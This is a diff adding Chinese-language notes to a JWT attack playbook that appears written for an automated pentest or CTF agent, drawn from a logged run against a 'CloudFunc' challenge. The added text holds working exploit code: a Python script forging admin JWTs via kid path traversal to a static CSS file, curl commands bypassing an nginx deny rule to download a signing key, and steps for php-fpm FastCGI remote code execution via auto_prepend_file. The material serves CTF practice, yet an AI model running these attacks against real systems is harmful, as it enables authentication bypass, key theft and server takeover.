@@ -11,6 +11,19 @@ Use this file for token-centric attacks and flow abuse. Also load:
 - [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) when browser-readable APIs or token leakage may exist cross-origin
 - [saml sso assertion attacks](../saml-sso-assertion-attacks/SKILL.md) when the target uses enterprise SSO outside OAuth/OIDC
 
+**穷举参考**：需要完整 CVE 编号、jwt_tool/hashcat 精确语法、PortSwigger labs 清单时，
+查 payloads skill 的 `references/json-web-token.md`。本文件是权威实战 playbook——新的
+攻击流程与赛题技巧只写进这里，那份只做静态语料参考。
+
+### 最短成功链（CloudFunc / kid=prod.key，a-18 实测）
+
+1. `kid=../css/reset.css`，HMAC 密钥 = **reset.css 全文**（勿 strip）→ 伪造 `role=admin`
+2. `php_code.execute` 试不通（PHP 把 `.` 转 `_`）→ 转第 3 条 FastCGI
+3. 扫 **php-fpm:9000** → FastCGI（`auto_prepend_file=php://input`）RCE
+4. flag 常在本机 metadata unix socket（响应头 `CloudFuncMetadata/1.0`）
+
+细节见下方 §5「a-18 实测活路」与「php_code 不通 / FastCGI」。
+
 如果文件不存在的话通过搜索引擎去搜索下
 
 ---
@@ -124,6 +137,31 @@ APP_NAME, app_name, production, jwt_secret, SECRET_KEY
 
 ## 5. ATTACK 4 — kid (Key ID) INJECTION
 
+> ⚠️ **run-13844 a-18**：拿到 `kid:"prod.key"` 后只 load 了 `serverless.md`，用 high 推理盲猜。
+> **看到 `kid`→`prod.key` 的第一步必须是本节路径遍历读密钥**，再 HS256 伪造；不要先猜空 kid/none。
+
+### ✅ a-18 实测活路（优先于 `/keys/` deny 绕过）
+
+CloudFunc 类题密钥路径 = `DOCROOT/keys/{kid}`。**不要死磕下载 `prod.key`**：把 `kid`
+改成可读的静态文件，HMAC 密钥 = 该文件全文：
+
+```bash
+# kid=../css/reset.css → 密钥 = reset.css 全文（实测 ~1418 字节）→ 伪造任意 role
+python3 - <<'PY'
+import hmac, hashlib, base64, json, urllib.request
+TARGET = "http://TARGET"
+css = urllib.request.urlopen(TARGET + "/css/reset.css").read()  # 原样字节，勿 strip 改动
+def b64(d): return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=")
+h = b64({"alg": "HS256", "typ": "JWT", "kid": "../css/reset.css"})
+p = b64({"email": "admin@example.com", "role": "admin"})
+s = base64.urlsafe_b64encode(hmac.new(css, h + b"." + p, hashlib.sha256).digest()).rstrip(b"=")
+print(f"{h.decode()}.{p.decode()}.{s.decode()}")
+PY
+```
+
+其它可读静态文件（`../js/app.js`、`../favicon.ico`）同理。拿到 admin JWT 后：
+**`php_code.execute` 不通**（点号转下划线，见下），转 **php-fpm:9000 FastCGI RCE**。
+
 The `kid` header parameter specifies which key to use for verification. No sanitization = injection:
 
 ### kid SQL Injection
@@ -143,6 +181,58 @@ Server reads `/dev/null` as key → empty string → sign token with empty HMAC.
 {"alg":"HS256","kid":"../../../../etc/hostname"}
 ```
 Server reads hostname as key → forge tokens signed with hostname string.
+
+### 密钥文件被 deny（403）时的路径归一化绕过
+
+JWT 的 `kid` 常指向 `prod.key` 这类密钥文件，而密钥文件往往在 webroot 下的
+`/keys/`、`/secret/` 等目录，被 nginx `location /keys/ { deny all; }` 拒绝（返回 403）。
+**403 说明文件存在但被 deny——这是路径归一化绕过的信号，不是终点**：
+
+```bash
+# 对比 403 vs 404：403=存在但被 deny，404=归一化逃出了 deny 前缀（绕过命中）
+curl -s -o /dev/null -w "%{http_code}\n" http://TARGET/keys/prod.key           # 403 基准
+curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys/.%2e/prod.key"    # 404=命中！
+curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys/../keys/prod.key"
+curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys/./prod.key"
+curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys../prod.key"       # off-by-slash
+# 绕过成功后直接下载密钥内容：
+curl -s "http://TARGET/keys/.%2e/prod.key" > /tmp/prod.key
+# 然后用该密钥伪造 admin JWT：
+python3 -c "
+import hmac, hashlib, base64, json
+def b64(d): return base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=')
+key=open('/tmp/prod.key','rb').read().strip()
+h=b64({'alg':'HS256','typ':'JWT','kid':'prod.key'})
+p=b64({'email':'admin@example.com','role':'admin'})
+s=base64.urlsafe_b64encode(hmac.new(key,h.encode()+b'.'+p.encode(),hashlib.sha256).digest()).rstrip(b'=')
+print(f'{h.decode()}.{p.decode()}.{s.decode()}')
+"
+```
+
+**关键**：`%2e` 解码为 `.` 后，nginx 路径归一化把 `/.%2e/` 折叠成 `/`，使请求逃出
+`/keys/` 的 deny location。403→404 的状态码跳变就是逃逸成功。同主机若还有 LFI/静态
+目录穿越（如 `/public/static/../../`），也能读 PHP 源码找硬编码密钥。
+
+### 拿到 admin 后：优先 php-fpm FastCGI（规则引擎 `php_code.execute` 不通）
+
+CloudFunc 类题（a-18）拿到 admin JWT 后，规则引擎表单字段 `php_code.execute` **无法通过
+POST 提交**：PHP 5.6/8.x 一律把 POST/GET/COOKIE 键名中的 `.` 转成 `_`，服务端
+`$_POST['php_code.execute']` 永远读不到（实际只收到 `php_code_execute`）。
+urlencoded/multipart/%2E/嵌套 `php_code[execute]`/JSON/raw/GET 都试不通就转下一条活路。
+
+**✅ 实测成功的活路（a-18，83 轮解出）——规则引擎不通，转 php-fpm FastCGI**：
+1. 扫同主机其他端口，找 **php-fpm 9000 端口**（CloudFunc 常暴露 php-fpm）；
+2. 用 FastCGI 直接打 php-fpm：`PHP_VALUE=auto_prepend_file=php://input` + PHP 代码体，
+   即得 **RCE as www-data**（绕过 web 入口和规则引擎）；
+3. flag 往往不在文件里，而在本地 **unix socket 的 metadata 服务**
+   （响应头 `CloudFuncMetadata/1.0 Python/3.5.3`）；用 FastCGI 执行 PHP 去读该 socket 拿 flag。
+
+FastCGI 攻击：自写 `fcgi_exploit.py`（构造 FCGI_BEGIN_REQUEST + FCGI_PARAMS，
+PARAMS 里 `SCRIPT_FILENAME` 指向存在的 php 文件、`PHP_VALUE=auto_prepend_file=php://input`，
+请求体就是要执行的 PHP 代码），连 9000 端口发送即可。
+
+**判读**：php-fpm 9000 端口开放 = 直接 FastCGI RCE，优先级高于规则引擎；先 `nc -v 9000`
+确认端口再打，别在 web 表单的 php_code 参数上继续磨。
 
 ---
 
